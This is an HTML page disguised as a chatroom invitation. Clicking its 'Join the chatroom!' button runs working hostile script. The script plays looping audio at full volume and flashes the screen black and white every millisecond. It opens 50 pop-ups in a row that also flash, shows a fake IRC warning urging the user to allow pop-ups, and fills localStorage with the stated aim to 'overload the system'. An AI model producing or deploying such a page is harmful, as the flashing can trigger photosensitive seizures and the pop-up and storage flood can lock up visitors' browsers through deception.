<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>nevelose</title>
    <style>
        body {
            background-color: white;
            transition: background-color 0.1s;
        }
        #ircMessage {
            font-family: "Courier New", Courier, monospace;
            background-color: black;
            color: lime;
            padding: 10px;
            border-radius: 5px;
            width: 80%;
            margin: 0 auto;
            white-space: pre-wrap;
            font-size: 14px;
        }
        #ircMessage p {
            margin: 0;
        }
    </style>
</head>
<body>

    <!-- Button to trigger the pop-ups, sound, and flashing colors -->
    <button onclick="startEffect()">Join the chatroom!</button>

    <audio id="audioPlayer" loop>
        <source src="aaa.mp3" type="audio/mp3">
        Your browser does not support the audio element.
    </audio>

    <script>
        var audio = document.getElementById('audioPlayer');
        audio.volume = 1; // Set volume to full

        function startEffect() {
            audio.play(); // Start the main audio
            startFlashingColors(); // Start flashing colors on the main page
            createPopups(50); // Create multiple pop-ups (sequentially, 50 pop-ups for example)
        }

        function startFlashingColors() {
            // Flash the main page background white and black ultra fast
            setInterval(function() {
                document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
            }, 1); // Flash every 1ms (ultra-fast)
        }

        function createPopups(count) {
            let popupIndex = 0;
            let audioPlayed = false; // Flag to check if audio has been played in a pop-up

            function openNextPopup() {
                if (popupIndex < count) {
                    let popup = window.open('', '', 'width=300,height=200');
                    if (popup) {
                        // Write content to the pop-up only once when it's created
                        popup.document.write(`
                            <html>
                                <head>
                                    <title>Pop-up</title>
                                    <style>
                                        body {
                                            background-color: white;
                                        }
                                    </style>
                                </head>
                                <body>
                                    <audio id="audio" loop>
                                        <source src="your-audio-file.mp3" type="audio/mp3">
                                        Your browser does not support the audio element.
                                    </audio>
                                </body>
                            </html>
                        `);

                        // Play audio only in the first pop-up
                        if (!audioPlayed) {
                            let popupAudio = popup.document.getElementById('audio');
                            popupAudio.volume = 1; // Set the audio volume to full
                            popupAudio.play(); // Start playing the audio in the first pop-up
                            audioPlayed = true; // Set the flag to true to prevent further audio playback

                            // Simulate the IRC-like message after the first pop-up opens
                            setTimeout(() => {
                                popup.document.body.innerHTML = `
                                    <div id="ircMessage">
                                        <p><strong>IRC Chat:</strong> Welcome to nevelose chatroom!</p>
                                        <p><strong>System:</strong> Warning: Pop-ups are blocked. Please allow pop-ups to continue.</p>
                                        <p><strong>IRC Chat:</strong> To continue enjoying the experience, please enable pop-ups in your browser settings.</p>
                                    </div>
                                `;
                            }, 500); // Display the fake IRC message after a brief delay
                        }

                        // Flash random background color in the pop-up ultra fast (1ms)
                        setInterval(function() {
                            popup.document.body.style.backgroundColor = Math.random() > 0.5 ? 'white' : 'black';
                        }, 1); // Flash every 1ms

                        // Manipulate local storage to overload the system
                        for (let i = 0; i < 10000; i++) {
                            localStorage.setItem('key' + i, 'value' + i);
                        }

                        popupIndex++;
                        openNextPopup(); // Open the next pop-up immediately (no delay)
                    }
                }
            }

            openNextPopup(); // Start opening pop-ups
        }

    </script>

</body>
</html>
